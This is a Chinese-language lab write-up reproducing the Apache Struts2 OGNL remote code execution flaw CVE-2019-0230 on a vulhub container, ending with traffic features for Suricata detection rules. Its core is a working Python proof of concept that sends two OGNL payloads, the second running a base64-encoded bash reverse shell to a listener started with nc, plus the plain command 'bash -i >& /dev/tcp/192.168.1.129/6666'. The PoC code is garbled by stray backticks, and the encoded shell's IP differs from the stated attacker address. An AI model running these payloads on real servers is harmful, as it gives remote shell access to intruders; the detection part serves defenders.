# 一、简介

2020年08月13日，Apache官方发布了Struts2远程代码执行漏洞的风险通告，该漏洞编号为CVE-2019-0230，漏洞等级：高危，漏洞评分：8.5

# 二、漏洞描述

Struts2是一个基于MVC设计模式的Web应用框架，它本质上相当于一个servlet，在MVC设计模式中，Struts2作为控制器(Controller)来建立模型与视图的数据交互。

 

漏洞产生的主要原因是因为Apache Struts框架在强制执行时，会对分配给某些标签属性(如id)的属性值执行二次ognl解析。攻击者可以通过构造恶意的OGNL表达式，并将其设置到可被外部输入进行修改，且会执行OGNL表达式的Struts2标签的属性值，引发OGNL表达式解析，最终造成远程代码执行的影响。

# 三、影响版本

```
Struts 2.0.0 – Struts 2.5.20
```

 

# 四、漏洞复现

## （1）漏洞环境

攻击机：192.168.1.129

靶机：  192.168.1.12

这里使用vulhub，很方便。

```
docker-compose up -d
```

启动环境之后访问http://your-ip:8080

![image.png](https://cdn.nlark.com/yuque/0/2020/png/262404/1604245560183-de8da39d-93a1-41a5-8bd8-666aae010817.png)

（2）漏洞验证

由于该漏洞是存在解析漏洞，也就是对于用户提交的数据进行了二次处理。

从而攻击者对输入的内容进行特意构造，然后实现攻击成。

URL `http://192.168.1.12:8080/?id=%25{2*3}` 

![image.png](https://cdn.nlark.com/yuque/0/2020/png/262404/1604330578391-b09fa643-f604-4ef0-a27f-e7190d0a532c.png)

（3）漏洞复现

**构造POC**

用来反弹shell

这里要修改两个地方：

1.靶机IP

192.168.1.12

2.攻击机IP反弹shell base64编码

bash -i >& /dev/tcp/192.168.1.129/6666 0>&1

 

```
import` `requests``url ``=` `"http://192.168.1.12:8080"``data1 ``=` `{``  ``"id"``: ``"%{(#context=#attr['struts.valueStack'].context).(#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.setExcludedClasses('')).(#ognlUtil.setExcludedPackageNames(''))}"``}``data2 ``=` `{``  ``"id"``: ``"%{(#context=#attr['struts.valueStack'].context).(#context.setMemberAccess(@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)).(@java.lang.Runtime@getRuntime().exec('bash -c  {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjEuMTIvNjY2NiAwPiYxCg==}|{base64,-d}|{bash,-i}'))}"``}``res1 ``=` `requests.post(url, data``=``data1)``res2 ``=` `requests.post(url, data``=``data2)
```

　　

1.监听端口

```
nc -lvvp 6666
```

2.运行脚本

```
python3 payload.py
```

3.反弹shell

![image.png](https://cdn.nlark.com/yuque/0/2020/png/262404/1604331334394-efa55a06-a180-408b-906c-efa3b2e2db75.png)

# 五、漏洞分析

攻击的时候抓取数据包

![image.png](https://cdn.nlark.com/yuque/0/2020/png/262404/1604331538859-27d33393-af0c-4542-b96b-a3fee2d29c10.png)

![image.png](https://cdn.nlark.com/yuque/0/2020/png/262404/1604332378455-66de17ea-0046-4283-b748-755de5f609c7.png)

# 六、特征提取

从攻击数据包里可以很清楚的看到，攻击者通过id值=xxx，来传入恶意的payload，

其中 %25是 % ，%7B是{，%7D是}

而请求包中包含payload，例如suricata规则中可以用content来匹配。

我们还是先对发送包进行URL解码:

```
id``=%{(``#context=#attr['struts.valueStack'].context).(#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.setExcludedClasses('')).(#ognlUtil.setExcludedPackageNames(''))}
```

　

```
这样就很清晰了，可以得到双向规则，来防护这个漏洞的攻击。
```

| 特征              | 说明             |
| ----------------- | ---------------- |
| POST方式          | http.method=POST |
| 状态码 200        |                  |
| 请求头 包含 %     |                  |
| 请求头 包含  {    |                  |
| 请求头 包含  }    |                  |
| 请求头包含payload |                  |
| 响应头包含payload |                  |